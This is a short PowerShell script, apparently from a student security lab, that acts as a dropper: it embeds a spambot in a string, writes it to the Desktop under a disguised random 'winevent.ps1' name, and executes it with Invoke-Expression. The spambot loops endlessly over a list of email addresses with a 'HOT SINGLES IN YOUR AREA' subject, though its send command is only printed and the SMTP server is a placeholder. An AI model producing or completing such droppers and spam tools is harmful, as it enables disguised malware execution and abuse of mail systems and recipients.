<# 
    Storyline: Dropper for the spambot 
    that will save to a directory and execute it 
#>

$writeSbBot = @'
# Send an email using Powershell
# array to hold email list to spam
$toSend = @('john.tiseo@mymail.champlain.edu', 'tiseo@mymail.champlain.edu', 'john@mymail.champlain.edu')
# Message body 
$msg = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum"
while ($true) 
{
    foreach ($email in $toSend) 
    {
        # Send the email 
        write-host "Send-MailMessage - from 'john.tiseo@mymail.champlain.edu' -To $email -Subject 'HOT SINGLES IN YOUR AREA'`
        -Body $msg -SmtpServer X.X.X.X"
        # Pause for one second
        # start-sleep 1
    }
}
'@
# Directory to write the bot
$sbDir = 'C:\Users\johnt\Desktop\'

# Create a random number to add to the file.
$sbRand = Get-Random -Minimum 1000 -Maximum 1999


# 'C:\Users\johnt\Desktop\1034winevent.ps1
# Create the file and location to save the bot 
$file = $sbDir + $sbRand +"winevent.ps1"

# write to a file
$writeSbBot | out-file -FilePath $file

# Executes the PowerShell script
Invoke-Expression $file